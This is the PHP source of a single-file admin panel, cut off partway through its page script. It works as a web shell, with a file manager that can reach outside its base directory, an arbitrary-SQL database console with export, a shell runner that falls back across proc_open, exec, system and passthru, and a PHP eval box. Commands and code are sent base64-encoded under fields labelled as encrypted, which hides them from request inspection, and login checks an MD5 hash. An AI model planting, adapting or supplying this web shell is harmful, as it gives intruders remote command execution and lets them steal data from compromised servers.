<?php

$config = [
  'base_path' => __DIR__,
  'allow_outside_base' => true,
  'enable_cmd' => true,
  'crypto' => true,
  'db' => [
    'host' => '127.0.0.1',
    'port' => '',
    'user' => 'root',
    'pass' => '',
    'name' => '',
  ],
  'users' => [
    'admin' => 'cbd957f22b55a800668cd57bbae12794',
  ],
  'log' => false,
  'log_file' => __DIR__ . '/admin.log',
  'max_edit_bytes' => 1024 * 1024,
];

session_start();

class App {
  private static $runtimeErrors = array();
  private static $handlingFatal = false;
  private static $errorHandlingInit = false;

  public static function config($key = null) {
    global $config;
    if ($key === null) {
      return $config;
    }
    return array_key_exists($key, $config) ? $config[$key] : null;
  }

  public static function h($value) {
    $flags = ENT_QUOTES;
    if (defined('ENT_SUBSTITUTE')) {
      $flags |= ENT_SUBSTITUTE;
    }
    return htmlspecialchars((string)$value, $flags, 'UTF-8');
  }

  public static function param($key, $default = null, $decode = false) {
    if (array_key_exists($key, $_POST)) {
      $value = $_POST[$key];
    } elseif (array_key_exists($key, $_GET)) {
      $value = $_GET[$key];
    } else {
      $value = $default;
    }
    if ($decode && $value !== null && $value !== '') {
      if (preg_match('/^[A-Za-z0-9_-]+$/', (string)$value)) {
        $decoded = self::dec($value);
        if ($decoded !== false) {
          return $decoded;
        }
      }
    }
    return $value;
  }

  public static function enc($value) {
    if (!self::config('crypto')) {
      return $value;
    }
    return Crypto::enc((string)$value);
  }

  public static function dec($value) {
    if (!self::config('crypto')) {
      return $value;
    }
    return Crypto::dec((string)$value);
  }

  public static function csrfToken() {
    if (empty($_SESSION['csrf'])) {
      if (function_exists('random_bytes')) {
        $_SESSION['csrf'] = bin2hex(random_bytes(16));
      } elseif (function_exists('openssl_random_pseudo_bytes')) {
        $_SESSION['csrf'] = bin2hex(openssl_random_pseudo_bytes(16));
      } else {
        $_SESSION['csrf'] = sha1(uniqid('', true));
      }
    }
    return $_SESSION['csrf'];
  }

  public static function checkCsrf() {
    $session = isset($_SESSION['csrf']) ? $_SESSION['csrf'] : '';
    return isset($_POST['csrf']) && self::hashEquals((string)$session, (string)$_POST['csrf']);
  }

  public static function flash($message = null, $type = 'info') {
    if ($message === null) {
      $flash = isset($_SESSION['flash']) ? $_SESSION['flash'] : null;
      unset($_SESSION['flash']);
      return $flash;
    }
    $_SESSION['flash'] = ['msg' => (string)$message, 'type' => (string)$type];
  }

  public static function addRuntimeError($message) {
    $message = trim((string)$message);
    if ($message === '') {
      return;
    }
    self::$runtimeErrors[] = $message;
  }

  public static function runtimeErrors() {
    return self::$runtimeErrors;
  }

  public static function hashEquals($known, $user) {
    if (function_exists('hash_equals')) {
      return hash_equals($known, $user);
    }
    if (!is_string($known) || !is_string($user)) {
      return false;
    }
    $len = strlen($known);
    if ($len !== strlen($user)) {
      return false;
    }
    $result = 0;
    for ($i = 0; $i < $len; $i++) {
      $result |= ord($known[$i]) ^ ord($user[$i]);
    }
    return $result === 0;
  }

  public static function initErrorHandling() {
    if (self::$errorHandlingInit) {
      return;
    }
    self::$errorHandlingInit = true;
    set_error_handler(array('App', 'handleError'));
    set_exception_handler(array('App', 'handleException'));
    register_shutdown_function(array('App', 'handleShutdown'));
  }

  public static function handleError($severity, $message, $file, $line) {
    if (!(error_reporting() & $severity)) {
      return false;
    }
    $text = (string)$message . ' in ' . (string)$file . ':' . (string)$line;
    self::addRuntimeError($text);
    if (function_exists('error_log')) {
      error_log($text);
    }
    if ($severity === E_USER_ERROR || $severity === E_RECOVERABLE_ERROR) {
      if (class_exists('ErrorException')) {
        throw new ErrorException($message, 0, $severity, $file, $line);
      }
    }
    return true;
  }

  public static function handleException($ex) {
    $message = 'Unhandled exception';
    $details = '';
    if (is_object($ex)) {
      $message = get_class($ex) . ': ' . $ex->getMessage();
      $details = $ex->getFile() . ':' . $ex->getLine();
    }
    if (function_exists('error_log')) {
      error_log($message . ($details !== '' ? ' at ' . $details : ''));
    }
    self::renderErrorPage('Application Error', $message, $details);
    exit;
  }

  public static function handleShutdown() {
    $error = error_get_last();
    if (!is_array($error)) {
      return;
    }
    $fatalTypes = array(E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR);
    if (!in_array((int)$error['type'], $fatalTypes, true)) {
      return;
    }
    $message = (string)$error['message'];
    $details = (string)$error['file'] . ':' . (string)$error['line'];
    if (function_exists('error_log')) {
      error_log('Fatal error: ' . $message . ' at ' . $details);
    }
    self::renderErrorPage('Fatal Error', $message, $details);
  }

  private static function renderErrorPage($title, $message, $details) {
    if (self::$handlingFatal) {
      return;
    }
    self::$handlingFatal = true;
    if (!headers_sent()) {
      if (function_exists('http_response_code')) {
        http_response_code(500);
      } else {
        header('HTTP/1.1 500 Internal Server Error');
      }
      header('Content-Type: text/html; charset=utf-8');
    }
    $safeTitle = self::h($title);
    $safeMessage = self::h($message);
    $safeDetails = $details !== '' ? self::h($details) : '';
    echo '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">';
    echo '<title>' . $safeTitle . '</title>';
    echo '<style>body{font-family:Arial,Helvetica,sans-serif;background:#f6f1e7;color:#1f2933;margin:0;padding:24px;}';
    echo '.box{max-width:720px;margin:8vh auto;background:#fff;border:1px solid #e5dfd5;border-radius:12px;padding:20px;box-shadow:0 12px 24px rgba(31,41,51,0.08);}';
    echo 'h1{margin-top:0;font-size:22px;}pre{background:#111827;color:#e5e7eb;padding:12px;border-radius:8px;overflow:auto;}';
    echo '</style></head><body><div class="box">';
    echo '<h1>' . $safeTitle . '</h1><p>' . $safeMessage . '</p>';
    if ($safeDetails !== '') {
      echo '<pre>' . $safeDetails . '</pre>';
    }
    echo '</div></body></html>';
  }

  public static function redirect($route, array $params = []) {
    $params = array_merge(['r' => $route], $params);
    $query = http_build_query($params);
    header('Location: ?' . $query);
    exit;
  }

  public static function dispatch($route) {
    if ($route === 'logout') {
      Auth::logout();
    }
    Auth::handle($route);
    Auth::check($route);

    switch ($route) {
      case 'login':
        UI::login();
        return;
      case 'files':
        $data = Files::handle();
        UI::layout('Files', 'files', UI::files($data));
        return;
      case 'db':
        $data = DB::handle();
        UI::layout('Database', 'db', UI::db($data));
        return;
      case 'editor':
        $data = Editor::handle();
        UI::layout('Editor', 'editor', UI::editor($data));
        return;
      case 'cmd':
        $data = Cmd::handle();
        UI::layout('Command', 'cmd', UI::cmd($data));
        return;
      case 'php':
        $data = PhpExec::handle();
        UI::layout('PHP', 'php', UI::php($data));
        return;
      case 'system':
        UI::layout('System', 'system', UI::system());
        return;
      default:
        UI::layout('Dashboard', 'dashboard', UI::dashboard());
        return;
    }
  }
}

class Auth {
  public static function handle($route) {
    if ($route !== 'login') {
      return;
    }
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
      return;
    }
    if (!App::checkCsrf()) {
      App::flash('Invalid token.', 'error');
      App::redirect('login');
    }
    $user = trim((string)App::param('user', ''));
    $pass = (string)App::param('pass', '');
    if (self::verify($user, $pass)) {
      $_SESSION['u'] = $user;
      Log::write('login', $user);
      App::redirect('dashboard');
    }
    App::flash('Login failed.', 'error');
    App::redirect('login');
  }

  public static function check($route) {
    if (in_array($route, ['login', 'logout'], true)) {
      return;
    }
    if (empty($_SESSION['u'])) {
      App::redirect('login');
    }
  }

  public static function verify($user, $pass) {
    $users = App::config('users');
    if (!isset($users[$user])) {
      return false;
    }
    $stored = (string)$users[$user];
    if (stripos($stored, 'md5:') === 0) {
      $stored = substr($stored, 4);
    }
    if (!preg_match('/^[a-f0-9]{32}$/i', $stored)) {
      return false;
    }
    return App::hashEquals(strtolower($stored), md5($pass));
  }

  public static function logout() {
    $user = isset($_SESSION['u']) ? $_SESSION['u'] : '';
    $_SESSION = [];
    if (function_exists('session_status')) {
      if (session_status() === PHP_SESSION_ACTIVE) {
        session_regenerate_id(true);
      }
    } else {
      session_regenerate_id(true);
    }
    if ($user !== '') {
      Log::write('logout', $user);
    }
    App::flash('Logged out.');
    App::redirect('login');
  }

  public static function user() {
    return isset($_SESSION['u']) ? $_SESSION['u'] : '';
  }
}

class Crypto {
  public static function enc($value) {
    $b64 = base64_encode($value);
    return rtrim(strtr($b64, '+/', '-_'), '=');
  }

  public static function dec($value) {
    $value = strtr($value, '-_', '+/');
    $pad = strlen($value) % 4;
    if ($pad > 0) {
      $value .= str_repeat('=', 4 - $pad);
    }
    $decoded = base64_decode($value, true);
    return $decoded === false ? false : $decoded;
  }
}

class Files {
  public static function handle() {
    $pathInput = trim((string)App::param('path', ''));
    $cwd = $pathInput !== '' ? $pathInput : (string)App::param('p', '', true);
    $action = (string)App::param('action', '');

    if ($action === 'download') {
      $file = (string)App::param('file', '', true);
      self::download($file);
      exit;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('files', ['p' => App::enc($cwd)]);
      }
      if ($action === 'mkdir') {
        $name = (string)App::param('name', '');
        if (self::mkdir($cwd, $name)) {
          App::flash('Folder created.', 'success');
        } else {
          App::flash('Failed to create folder.', 'error');
        }
        App::redirect('files', ['p' => App::enc($cwd)]);
      }
      if ($action === 'touch') {
        $name = (string)App::param('name', '');
        if (self::touch($cwd, $name)) {
          App::flash('File created.', 'success');
        } else {
          App::flash('Failed to create file.', 'error');
        }
        App::redirect('files', ['p' => App::enc($cwd)]);
      }
      if ($action === 'delete') {
        $target = (string)App::param('target', '', true);
        if ($target !== '' && self::delete($target)) {
          App::flash('Deleted.', 'success');
        } else {
          App::flash('Delete failed.', 'error');
        }
        App::redirect('files', ['p' => App::enc($cwd)]);
      }
      if ($action === 'upload') {
        if (!empty($_FILES['upload']) && self::upload($cwd, $_FILES['upload'])) {
          App::flash('Upload complete.', 'success');
        } else {
          App::flash('Upload failed.', 'error');
        }
        App::redirect('files', ['p' => App::enc($cwd)]);
      }
    }

    $path = self::resolve($cwd);
    if ($path === false || !is_dir($path)) {
      $cwd = '';
    }

    $items = self::ls($cwd);
    return [
      'cwd' => $cwd,
      'items' => $items,
    ];
  }

  public static function base() {
    $base = (string)App::config('base_path');
    return rtrim(str_replace('\\', '/', $base), '/');
  }

  public static function resolve($rel) {
    $base = self::base();
    $path = self::normalizePath($rel);
    if ($path === '' || $path === '.') {
      return $base;
    }
    if (self::isAbsolutePath($path)) {
      if (!App::config('allow_outside_base')) {
        return false;
      }
      $real = realpath($path);
      if ($real !== false) {
        return str_replace('\\', '/', $real);
      }
      $parent = realpath(dirname($path));
      if ($parent === false) {
        return false;
      }
      return str_replace('\\', '/', $path);
    }

    $path = ltrim($path, '/');
    if (strpos($path, '..') !== false) {
      return false;
    }

    $full = $base . '/' . $path;
    $real = realpath($full);
    if ($real !== false) {
      $real = str_replace('\\', '/', $real);
      return strpos($real, $base) === 0 ? $real : false;
    }

    $parent = realpath(dirname($full));
    if ($parent === false) {
      return false;
    }
    $parent = str_replace('\\', '/', $parent);
    if (strpos($parent, $base) !== 0) {
      return false;
    }
    return str_replace('\\', '/', $full);
  }

  public static function rel($abs) {
    $base = self::base();
    $abs = str_replace('\\', '/', $abs);
    if (strpos($abs, $base) !== 0) {
      return self::normalizePath($abs);
    }
    return ltrim(substr($abs, strlen($base)), '/');
  }

  public static function ls($rel) {
    $path = self::resolve($rel);
    if ($path === false || !is_dir($path)) {
      return [];
    }
    $items = array_diff(scandir($path), ['.', '..']);
    $out = [];
    foreach ($items as $name) {
      $full = $path . '/' . $name;
      $isDir = is_dir($full);
      $out[] = [
        'name' => $name,
        'rel' => self::rel($full),
        'is_dir' => $isDir,
        'size' => $isDir ? 0 : (int)@filesize($full),
        'mtime' => (int)@filemtime($full),
      ];
    }
    usort($out, function ($a, $b) {
      if ($a['is_dir'] === $b['is_dir']) {
        return strcasecmp($a['name'], $b['name']);
      }
      return $a['is_dir'] ? -1 : 1;
    });
    return $out;
  }

  public static function mkdir($rel, $name) {
    $name = self::safeName($name);
    if ($name === '') {
      return false;
    }
    $base = self::resolve($rel);
    if ($base === false || !is_dir($base)) {
      return false;
    }
    $target = self::resolve(self::joinPath($rel, $name));
    if ($target === false || file_exists($target)) {
      return false;
    }
    return @mkdir($target, 0777);
  }

  public static function touch($rel, $name) {
    $name = self::safeName($name);
    if ($name === '') {
      return false;
    }
    $base = self::resolve($rel);
    if ($base === false || !is_dir($base)) {
      return false;
    }
    $target = self::resolve(self::joinPath($rel, $name));
    if ($target === false || file_exists($target)) {
      return false;
    }
    return @file_put_contents($target, '') !== false;
  }

  public static function delete($rel) {
    if ($rel === '') {
      return false;
    }
    $path = self::resolve($rel);
    if ($path === false) {
      return false;
    }
    if (is_dir($path)) {
      return @rmdir($path);
    }
    return @unlink($path);
  }

  public static function upload($rel, $file) {
    $error = isset($file['error']) ? $file['error'] : UPLOAD_ERR_NO_FILE;
    if (!is_array($file) || $error !== UPLOAD_ERR_OK) {
      return false;
    }
    $name = self::safeName((string)$file['name']);
    if ($name === '') {
      return false;
    }
    $base = self::resolve($rel);
    if ($base === false || !is_dir($base)) {
      return false;
    }
    $target = self::resolve(self::joinPath($rel, $name));
    if ($target === false) {
      return false;
    }
    return @move_uploaded_file($file['tmp_name'], $target);
  }

  public static function download($rel) {
    $path = self::resolve($rel);
    if ($path === false || !is_file($path)) {
      return;
    }
    $name = basename($path);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    header('Content-Length: ' . filesize($path));
    readfile($path);
  }

  private static function normalizePath($path) {
    $path = str_replace("\0", '', (string)$path);
    $path = str_replace('\\', '/', $path);
    $path = trim($path);
    if (preg_match('/^[A-Za-z]:$/', $path)) {
      $path .= '/';
    }
    return $path;
  }

  private static function joinPath($base, $name) {
    $base = rtrim(self::normalizePath($base), '/');
    if ($base === '') {
      return $name;
    }
    return $base . '/' . $name;
  }

  private static function isAbsolutePath($path) {
    if ($path === '') {
      return false;
    }
    if (strpos($path, '//') === 0 || strpos($path, '/') === 0) {
      return true;
    }
    return (bool)preg_match('/^[A-Za-z]:\//', $path);
  }

  private static function safeName($name) {
    $name = trim(str_replace(["\0", "\r", "\n"], '', (string)$name));
    if ($name === '' || $name === '.' || $name === '..') {
      return '';
    }
    if (strpos($name, '/') !== false || strpos($name, '\\') !== false) {
      return '';
    }
    return $name;
  }
}

class DB {
  public static function handle() {
    $data = [
      'enabled' => true,
      'error' => '',
      'dbs' => [],
      'tables' => [],
      'db' => '',
      'table' => '',
      'rows' => [],
      'sql' => '',
      'sql_result' => null,
      'sql_error' => '',
      'sql_ran' => false,
      'cfg' => [],
    ];

    $action = (string)App::param('action', '');
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && in_array($action, ['connect', 'disconnect'], true)) {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('db');
      }
      if ($action === 'disconnect') {
        self::clearCfg();
        App::flash('DB settings cleared.', 'info');
        App::redirect('db');
      }
      $current = self::cfg();
      $next = [
        'host' => trim((string)App::param('host', isset($current['host']) ? $current['host'] : '')),
        'port' => trim((string)App::param('port', isset($current['port']) ? $current['port'] : '')),
        'user' => trim((string)App::param('user', isset($current['user']) ? $current['user'] : '')),
        'pass' => (string)App::param('pass', ''),
        'name' => trim((string)App::param('name', isset($current['name']) ? $current['name'] : '')),
      ];
      if ($next['pass'] === '' && isset($current['pass'])) {
        $next['pass'] = (string)$current['pass'];
      }
      self::setCfg($next);
      App::flash('DB settings updated.', 'success');
      App::redirect('db');
    }

    $cfg = self::cfg();
    $data['cfg'] = $cfg;
    if (!self::enabled()) {
      $data['enabled'] = false;
      $data['error'] = 'PDO not available.';
      return $data;
    }
    if (empty($cfg['host']) || empty($cfg['user'])) {
      $data['enabled'] = false;
      $data['error'] = 'DB config missing.';
      return $data;
    }

    try {
      $pdoRoot = self::pdo();
    } catch (Exception $e) {
      $data['enabled'] = false;
      $data['error'] = $e->getMessage();
      return $data;
    }

    $dbs = self::listDatabases($pdoRoot);
    $data['dbs'] = $cfg['name'] !== '' ? [$cfg['name']] : $dbs;
    $fallbackDb = isset($data['dbs'][0]) ? $data['dbs'][0] : '';
    $data['db'] = (string)App::param('db', $cfg['name'] !== '' ? $cfg['name'] : $fallbackDb, true);
    if ($data['db'] !== '' && !self::safeName($data['db'])) {
      $data['error'] = 'Invalid database name.';
      return $data;
    }

    $tables = $data['db'] !== '' ? self::listTables($pdoRoot, $data['db']) : [];
    $data['tables'] = $tables;
    $fallbackTable = isset($tables[0]) ? $tables[0] : '';
    $data['table'] = (string)App::param('table', $fallbackTable, true);
    if ($data['table'] !== '' && !self::safeName($data['table'])) {
      $data['error'] = 'Invalid table name.';
      return $data;
    }
    if ($data['table'] !== '' && !in_array($data['table'], $tables, true)) {
      $data['table'] = isset($tables[0]) ? $tables[0] : '';
    }
    $tableValid = $data['table'] !== '' && in_array($data['table'], $tables, true);

    if ($action === 'export' && $data['db'] !== '' && $tableValid) {
      self::exportCsv($data['db'], $data['table']);
      exit;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'sql') {
      $data['sql_ran'] = true;
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('db', ['db' => App::enc($data['db']), 'table' => App::enc($data['table'])]);
      }
      $sql = trim((string)App::param('sql', ''));
      if ($sql !== '' && $data['table'] !== '' && preg_match('/^\s*select\b/i', $sql) && !preg_match('/\bfrom\b/i', $sql)) {
        $sql = rtrim($sql, ";\r\n\t ") . ' FROM ' . self::quoteName($data['table']);
      }
      $data['sql'] = $sql;
      if ($sql !== '') {
        try {
          $data['sql_result'] = self::runSql($data['db'], $sql);
        } catch (Exception $e) {
          $data['sql_error'] = $e->getMessage();
        }
      }
    }

    if ($data['db'] !== '' && $tableValid) {
      try {
        $data['rows'] = self::listRows($data['db'], $data['table'], 50);
      } catch (Exception $e) {
        $data['error'] = $e->getMessage();
      }
    }

    return $data;
  }

  public static function enabled() {
    return class_exists('PDO');
  }

  public static function pdo($dbName = null) {
    $cfg = self::cfg();
    $dsn = 'mysql:host=' . $cfg['host'] . ';charset=utf8mb4';
    if (!empty($cfg['port']) && ctype_digit((string)$cfg['port'])) {
      $dsn .= ';port=' . (string)$cfg['port'];
    }
    if (!empty($dbName)) {
      $dsn .= ';dbname=' . $dbName;
    }
    return new PDO($dsn, $cfg['user'], $cfg['pass'], [
      PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
      PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
  }

  public static function listDatabases(PDO $pdo) {
    $rows = $pdo->query('SHOW DATABASES')->fetchAll(PDO::FETCH_COLUMN);
    return is_array($rows) ? $rows : [];
  }

  public static function listTables(PDO $pdo, $db) {
    if (!self::safeName($db)) {
      return [];
    }
    $rows = $pdo->query('SHOW TABLES FROM ' . self::quoteName($db))->fetchAll(PDO::FETCH_COLUMN);
    return is_array($rows) ? $rows : [];
  }

  public static function listRows($db, $table, $limit) {
    if (!self::safeName($db) || !self::safeName($table)) {
      return [];
    }
    $pdo = self::pdo($db);
    $sql = 'SELECT * FROM ' . self::quoteName($db) . '.' . self::quoteName($table) . ' LIMIT ' . (int)$limit;
    return $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
  }

  public static function exportCsv($db, $table) {
    if (!self::safeName($db) || !self::safeName($table)) {
      return;
    }
    $pdo = self::pdo($db);
    $stmt = $pdo->query('SELECT * FROM ' . self::quoteName($db) . '.' . self::quoteName($table));
    $name = $db . '_' . $table . '.csv';
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="' . $name . '"');
    $out = fopen('php://output', 'w');
    $first = true;
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
      if ($first) {
        fputcsv($out, array_keys($row));
        $first = false;
      }
      fputcsv($out, $row);
    }
    fclose($out);
  }

  public static function runSql($db, $sql) {
    $pdo = self::pdo($db !== '' ? $db : null);
    if (preg_match('/^\s*select/i', $sql)) {
      $stmt = $pdo->query($sql);
      return ['type' => 'select', 'rows' => $stmt->fetchAll(PDO::FETCH_ASSOC)];
    }
    $count = $pdo->exec($sql);
    return ['type' => 'exec', 'count' => $count];
  }

  private static function safeName($name) {
    return (bool)preg_match('/^[A-Za-z0-9_]+$/', (string)$name);
  }

  private static function quoteName($name) {
    return '`' . str_replace('`', '``', (string)$name) . '`';
  }

  private static function cfg() {
    $cfg = App::config('db');
    if (!is_array($cfg)) {
      $cfg = [];
    }
    $session = isset($_SESSION['db_cfg']) ? $_SESSION['db_cfg'] : null;
    if (is_array($session)) {
      $cfg = array_merge($cfg, $session);
    }
    $allowed = ['host', 'port', 'user', 'pass', 'name'];
    $filtered = [];
    foreach ($allowed as $key) {
      $filtered[$key] = isset($cfg[$key]) ? $cfg[$key] : '';
    }
    return $filtered;
  }

  private static function setCfg(array $cfg) {
    $allowed = ['host', 'port', 'user', 'pass', 'name'];
    $filtered = [];
    foreach ($allowed as $key) {
      $filtered[$key] = isset($cfg[$key]) ? $cfg[$key] : '';
    }
    $_SESSION['db_cfg'] = $filtered;
  }

  private static function clearCfg() {
    unset($_SESSION['db_cfg']);
  }
}

class Editor {
  public static function handle() {
    $file = (string)App::param('file', '', true);
    $data = [
      'file' => $file,
      'content' => '',
      'error' => '',
    ];

    if ($file === '') {
      $data['error'] = 'No file selected.';
      return $data;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && App::param('action') === 'save') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('editor', ['file' => App::enc($file)]);
      }
      if (!array_key_exists('content_enc', $_POST)) {
        App::flash('Encrypted content missing.', 'error');
        App::redirect('editor', ['file' => App::enc($file)]);
      }
      $contentEnc = (string)$_POST['content_enc'];
      $content = Crypto::dec($contentEnc);
      if ($content === false) {
        App::flash('Encrypted content invalid.', 'error');
        App::redirect('editor', ['file' => App::enc($file)]);
      }
      if (self::save($file, $content)) {
        App::flash('Saved.', 'success');
      } else {
        App::flash('Save failed.', 'error');
      }
      App::redirect('editor', ['file' => App::enc($file)]);
    }

    $loaded = self::load($file);
    if (!$loaded['ok']) {
      $data['error'] = $loaded['error'];
      return $data;
    }
    $data['content'] = $loaded['content'];
    return $data;
  }

  public static function load($rel) {
    $path = Files::resolve($rel);
    if ($path === false || !is_file($path)) {
      return ['ok' => false, 'content' => '', 'error' => 'File not found.'];
    }
    $max = (int)App::config('max_edit_bytes');
    if ($max > 0 && filesize($path) > $max) {
      return ['ok' => false, 'content' => '', 'error' => 'File too large to edit.'];
    }
    $content = @file_get_contents($path);
    if ($content === false) {
      return ['ok' => false, 'content' => '', 'error' => 'Failed to read file.'];
    }
    return ['ok' => true, 'content' => $content, 'error' => ''];
  }

  public static function save($rel, $content) {
    $path = Files::resolve($rel);
    if ($path === false || is_dir($path)) {
      return false;
    }
    return @file_put_contents($path, $content) !== false;
  }
}

class Cmd {
  public static function handle() {
    $methods = self::availableMethods();
    $data = [
      'enabled' => App::config('enable_cmd'),
      'supported' => !empty($methods),
      'methods' => $methods,
      'method' => '',
      'output' => '',
      'exit_code' => null,
      'cmd' => '',
      'error' => '',
    ];

    if (!$data['enabled']) {
      return $data;
    }
    if (!$data['supported']) {
      $data['error'] = 'Command execution not supported.';
      return $data;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && App::param('action') === 'run') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('cmd');
      }
      if (!array_key_exists('cmd_enc', $_POST)) {
        $data['error'] = 'Encrypted command missing.';
        return $data;
      }
      $cmd = Crypto::dec((string)$_POST['cmd_enc']);
      if ($cmd === false) {
        $data['error'] = 'Encrypted command invalid.';
        return $data;
      }
      $cmd = trim((string)$cmd);
      $data['cmd'] = $cmd;
      if ($cmd === '') {
        $data['error'] = 'No command provided.';
        return $data;
      }
      $result = self::run($cmd);
      $data['output'] = $result['output'];
      $data['exit_code'] = $result['exit_code'];
      $data['method'] = $result['method'];
    }

    return $data;
  }

  public static function can() {
    return !empty(self::availableMethods());
  }

  public static function availableMethods() {
    $disabled = array_filter(array_map('trim', explode(',', (string)ini_get('disable_functions'))));
    $methods = [];
    foreach (['proc_open', 'exec', 'shell_exec', 'system', 'passthru'] as $fn) {
      if (function_exists($fn) && !in_array($fn, $disabled, true)) {
        $methods[] = $fn;
      }
    }
    return $methods;
  }

  public static function run($cmd) {
    $methods = self::availableMethods();
    $prepared = self::prepareCommand($cmd);
    foreach ($methods as $method) {
      if ($method === 'proc_open') {
        $spec = [
          0 => ['pipe', 'r'],
          1 => ['pipe', 'w'],
          2 => ['pipe', 'w'],
        ];
        $process = proc_open($prepared, $spec, $pipes);
        if (is_resource($process)) {
          fclose($pipes[0]);
          $stdout = stream_get_contents($pipes[1]);
          $stderr = stream_get_contents($pipes[2]);
          fclose($pipes[1]);
          fclose($pipes[2]);
          $exit = proc_close($process);
          return [
            'output' => self::normalizeOutput((string)$stdout . (string)$stderr),
            'exit_code' => $exit,
            'method' => 'proc_open',
          ];
        }
      }
      if ($method === 'exec') {
        $output = [];
        $exit = 0;
        exec($prepared . ' 2>&1', $output, $exit);
        return [
          'output' => self::normalizeOutput(implode("\n", $output)),
          'exit_code' => $exit,
          'method' => 'exec',
        ];
      }
      if ($method === 'shell_exec') {
        $out = shell_exec($prepared . ' 2>&1');
        return [
          'output' => self::normalizeOutput((string)$out),
          'exit_code' => null,
          'method' => 'shell_exec',
        ];
      }
      if ($method === 'system') {
        $exit = 0;
        ob_start();
        system($prepared . ' 2>&1', $exit);
        $out = ob_get_clean();
        return [
          'output' => self::normalizeOutput((string)$out),
          'exit_code' => $exit,
          'method' => 'system',
        ];
      }
      if ($method === 'passthru') {
        $exit = 0;
        ob_start();
        passthru($prepared . ' 2>&1', $exit);
        $out = ob_get_clean();
        return [
          'output' => self::normalizeOutput((string)$out),
          'exit_code' => $exit,
          'method' => 'passthru',
        ];
      }
    }
    return [
      'output' => '',
      'exit_code' => null,
      'method' => 'none',
    ];
  }

  private static function prepareCommand($cmd) {
    $cmd = trim((string)$cmd);
    $os = defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS;
    if (stripos($os, 'Windows') !== false && !preg_match('/^\s*cmd\s+\/c\s+/i', $cmd)) {
      return 'cmd /c ' . $cmd;
    }
    return $cmd;
  }

  private static function normalizeOutput($text) {
    $text = (string)$text;
    if ($text === '') {
      return $text;
    }
    if (function_exists('mb_check_encoding') && mb_check_encoding($text, 'UTF-8')) {
      return $text;
    }
    if (function_exists('mb_detect_encoding')) {
      $enc = mb_detect_encoding($text, ['UTF-8', 'GBK', 'CP936', 'BIG5', 'CP1252', 'ISO-8859-1'], true);
      if ($enc && strtoupper($enc) !== 'UTF-8') {
        $converted = @mb_convert_encoding($text, 'UTF-8', $enc);
        if ($converted !== false) {
          return $converted;
        }
      }
    }
    if (function_exists('iconv')) {
      $converted = @iconv('GBK', 'UTF-8//IGNORE', $text);
      if ($converted !== false && $converted !== '') {
        return $converted;
      }
    }
    return $text;
  }
}

class PhpExec {
  public static function handle() {
    $data = [
      'code' => '',
      'output' => '',
      'return' => '',
      'error' => '',
      'ran' => false,
    ];

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && App::param('action') === 'run') {
      if (!App::checkCsrf()) {
        App::flash('Invalid token.', 'error');
        App::redirect('php');
      }
      if (!array_key_exists('code_enc', $_POST)) {
        $data['error'] = 'Encrypted code missing.';
        return $data;
      }
      $code = Crypto::dec((string)$_POST['code_enc']);
      if ($code === false) {
        $data['error'] = 'Encrypted code invalid.';
        return $data;
      }
      $code = self::normalizeCode((string)$code);
      if ($code === '') {
        $data['error'] = 'No code provided.';
        return $data;
      }
      $data['code'] = $code;
      $data['ran'] = true;

      $output = '';
      $result = null;
      if (defined('PHP_VERSION_ID') && PHP_VERSION_ID >= 70000) {
        try {
          ob_start();
          $result = eval($code);
          $output = ob_get_clean();
        } catch (Throwable $e) {
          $output = ob_get_clean();
          $data['error'] = $e->getMessage();
        }
      } else {
        try {
          ob_start();
          $result = eval($code);
          $output = ob_get_clean();
        } catch (Exception $e) {
          $output = ob_get_clean();
          $data['error'] = $e->getMessage();
        }
      }
      $data['output'] = (string)$output;
      if ($data['error'] === '') {
        $data['return'] = var_export($result, true);
      }
    }

    return $data;
  }

  private static function normalizeCode($code) {
    $code = preg_replace('/^\s*<\?php/i', '', $code);
    $code = preg_replace('/\?>\s*$/', '', $code);
    return trim((string)$code);
  }
}

class UI {
  public static function layout($title, $route, $body) {
    $user = Auth::user();
    $flash = App::flash();
    $runtimeErrors = App::runtimeErrors();
    $nav = self::navItems();
    App::csrfToken();
    ?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo App::h($title); ?></title>
  <script>
    window.fmCrypto = window.fmCrypto || (function () {
      function utf8ToBinary(input) {
        if (typeof TextEncoder !== 'undefined') {
          var bytes = new TextEncoder().encode(String(input || ''));
          var binary = '';
          for (var i = 0; i < bytes.length; i++) {
            binary += String.fromCharCode(bytes[i]);
          }
          return binary;
        }
        return unescape(encodeURIComponent(String(input || '')));
      }
      function binaryToUtf8(binary) {
        if (typeof TextDecoder !== 'undefined') {
          var bytes = new Uint8Array(binary.length);
          for (var i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
          }
          return new TextDecoder().decode(bytes);
        }
        return decodeURIComponent(escape(binary));
      }
      function enc(input) {
        var b64 = btoa(utf8ToBinary(input));
        return b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
      }
      function dec(input) {
        var b64 = String(input || '').replace(/-/g, '+').replace(/_/g, '/');
        var pad = b64.length % 4;
        if (pad) {
          b64 += '='.repeat(4 - pad);
        }
